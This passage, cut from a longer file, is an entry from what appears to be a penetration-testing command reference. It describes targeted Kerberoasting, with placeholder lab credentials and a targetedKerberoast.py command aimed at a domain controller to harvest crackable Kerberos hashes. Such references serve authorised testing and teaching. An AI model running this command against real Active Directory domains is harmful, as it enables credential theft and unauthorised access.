        \ hash, and delete the temporary SPN set for that operation.\n\n  Command Reference:\n\n  \tTarget\
        \ IP: 10.10.10.1\n\n  \tAttacker IP: 10.10.10.2\n\n  \tDomain: test.local\n\n  \tUsername: john\n\
        \n  \tPassword: password123\n\ncommand: |\n  python3 targetedKerberoast.py -d test.local -u john\
        \ -p password123 --dc-ip 10.10.10.1\nitems:\n  - Password\n  - Username\nservices:\n  - Kerberos\n\
        \  - NTLM\nOS:\n  - Linux\nattack_types:\n  - Exploitation\nreferences:\n  - https://github.com/ShutdownRepo/targetedKerberoast\n\
        ---\n"
